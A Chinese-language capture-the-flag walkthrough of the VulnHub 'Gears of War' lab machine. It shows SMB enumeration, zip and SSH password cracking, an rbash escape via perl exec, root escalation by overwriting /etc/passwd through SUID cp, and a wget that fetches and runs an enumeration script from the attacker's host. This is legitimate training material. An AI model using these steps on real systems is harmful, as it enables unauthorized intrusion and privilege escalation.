# Gears of War

## 一、测试环境

Gears of War靶机、Mac攻击机、kali2020辅助攻击机

```text
VM名称：GEARS OF WAR: EP#1
下载：https://download.vulnhub.com/gearsofwar/Gear_Of_War%231.ova
描述：Its a CTF machine that deals with the history of gears of war, where we must try to escape from prison and obtain root privileges. it has some rabbit holes, so you have to try to connect the tracks to get access.
运行：在VirtualBox中比VMware更好地工作
```

_**靶机Gears of War**_

![image-20210313215140539](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210313215140539.png)

## 二、信息收集

nmap扫描ip地址

![10A1214297B281B4BEDBD85BA7327576](https://gitee.com/Harveysn0w/mac-note_img/raw/master/10A1214297B281B4BEDBD85BA7327576.jpg)

我们访问172.20.10.14

![705A683D140FA56E02F8918FAB2B46A8](https://gitee.com/Harveysn0w/mac-note_img/raw/master/705A683D140FA56E02F8918FAB2B46A8.jpg)

接着再用nmap扫描详细信息

![E6A1EB13E5699FE317BC140D57FC1BC3](https://gitee.com/Harveysn0w/mac-note_img/raw/master/E6A1EB13E5699FE317BC140D57FC1BC3.jpg)

![0AD0512A-1B81-4414-9583-9E4BCC006846](https://gitee.com/Harveysn0w/mac-note_img/raw/master/0AD0512A-1B81-4414-9583-9E4BCC006846.png)

没啥发现。dirsearch扫描目录看看。

![image-20210314162417916](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210314162417916.png)

发现了robots.txt。访问一探究竟

![image-20210314162601017](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210314162601017.png)

发现了5个网页，打开看一看~看样子网页里面的注释可能是个hint。

![image-20210320133322686](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210320133322686.png)

从各页面得到如下提示

```text
marcus.html --> znephf
dom.html --> qbz
cole.html --> pbyr
baird.html --> onveq
acarmine.html --> npnezvar
znephfqbzpbyronveqnpnezvar
```

使用`enum4liux`进行smb信息枚举，得到共享`//192.168.56.101/LOCUS_LAN$`。

```text
enum4linux -a -o 172.20.10.14
```

![image-20210320152555433](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210320152555433.png)

![image-20210320152539120](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210320152539120.png)

![image-20210320153704135](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210320153704135.png)

用`smbclient`访问共享目录，得到两个文件。

```text
smbclient //172.20.10.14/LOCUS_LAN$ 
密码：GEARS_OF_WAR
```

![image-20210320153618472](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210320153618472.png)

![image-20210320153800750](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210320153800750.png)

把这两个文件get下来到本地

![image-20210320154051379](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210320154051379.png)

![image-20210320154105720](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210320154105720.png)

解压压缩包需要密码~ ![image-20210320154140946](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210320154140946.png)

先看看txt吧~里面是有关密码的提示：

![image-20210320154202404](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210320154202404.png)

应该是crunch

![image-20210320161116786](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210320161116786.png)

结合上面这两个，我们就知道需要使用`crunch`生成密码字典，并且密码的长度为4位，以及组合方式。最后使用`fcrackzip`破解得到密码`r44M`。

![image-20210320161434768](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210320161434768.png)

解压`msg_horda.zip`后得到`key.txt`。查看`key.txt`后发现里面有个字符串，结合之前的信息收集，想到的只有SSH的登录密码或者是网站的某个目录。

![image-20210320161637375](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210320161637375.png)

访问`http://172.20.10.14/3_d4y`提示未发现页面。

![image-20210320161555506](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210320161555506.png)

kali里面要先解压一个字典哦~

![image-20210320163210752](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210320163210752.png)

用`hydra`爆破一下得到了一组账号密码`marcus:3_d4y`，随后通过SSH登录系统。

![image-20210320172826500](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210320172826500.png)

![image-20210320173340791](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210320173340791.png)

![image-20210320173357515](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210320173357515.png)

## 三、渗透测试之rbash逃逸

我们进入其他目录提示rbash~

![image-20210320173709632](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210320173709632.png)

尝试了一下，绕不过去~

![image-20210320174017110](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210320174017110.png)

参考文章：

* 嘶吼：[渗透技巧——如何逃逸Linux的受限制shell执行任意命令](https://www.4hou.com/penetration/11674.html)
* 先知社区：[绕过Linux受限Shell环境的技巧](https://xz.aliyun.com/t/2333)

最后通过`perl -e 'exec "bin/sh";'`成功逃逸。

![image-20210320174143647](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210320174143647.png)

PS：参考~

![image-20210320174226855](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210320174226855.png)

## 四、提权

find命令发现了SUID权限的`/usr/share/vim`、`/usr/share/awk`、`/bin/cp`

```bash
find / -perm -u=s 2>/dev/null
```

![image-20210320184232564](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210320184232564.png)

![image-20210320184524496](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210320184524496.png)

vim和awk在这里都没法提权成功。这两个命令的提权条件见[https://gtfobins.github.io/gtfobins/awk/\#limited-suid、https://gtfobins.github.io/gtfobins/vim/\#limited-suid](https://gtfobins.github.io/gtfobins/awk/#limited-suid、https://gtfobins.github.io/gtfobins/vim/#limited-suid)

PS：虽然SUID权限的vim可以直接提权但是当前用户无法执行`sudo`命令。

我们这里用cp命令提权。思路就是新建一个passwd文件，复制靶机上`/etc/passwd`中的内容，并增加一条记录harveysn0w:$1$xyz$$1$xyz$Kml6AMovRrDDVezktQmzB/:0:0:root:/root:/bin/bash。然后用新建的passwd文件覆盖原有的/etc/passwd。

生成加密密码

```bash
openssl passwd -salt 'xyz' -1 harveysn0w
```

然后替换之前的密码

![image-20210320185105248](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210320185105248.png)

![image-20210320192050177](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210320192050177.png)

![image-20210320192112027](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210320192112027.png)

![4355B9CDA169CB1B976CE7A4961A1BDF](https://gitee.com/Harveysn0w/mac-note_img/raw/master/4355B9CDA169CB1B976CE7A4961A1BDF.jpg)

## 五、提权小话语

关于Linux提权，可以直接用脚本搜集一下对于提权有用的信息，比如用[linuxprivchecker.py](https://github.com/sleventyeleven/linuxprivchecker)、[LinEnum.sh](https://github.com/rebootuser/LinEnum).

> 如果你想熟悉一下没有脚本的情况下怎么收集这些信息可以参考[privilege_escalation_-\_linux](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html)

先在kali上开启HTTP服务

```bash
python -m SimpleHTTPServer 65534
```

使用wget下载linuxprivchecker.py脚本到靶机的tmp目录

> 因为靶机不允许直接访问Github，所以我是从自己的kali下载的

```bash
cd /tmp
wget http://192.168.0.108:65534/Desktop/linuxprivchecker.py
```

为了便于查看收集到的信息，我将结果输出到report.txt文本中，之后使用less查看

```bash
python linuxprivchecker.py > report.txt
less report.txt
```

靶机做了这些后发现还是手动收集更快……，手动收集不到有效信息的情况下再尝试用脚本。

## 六、其他

最后密码替换仍需仔细看看~

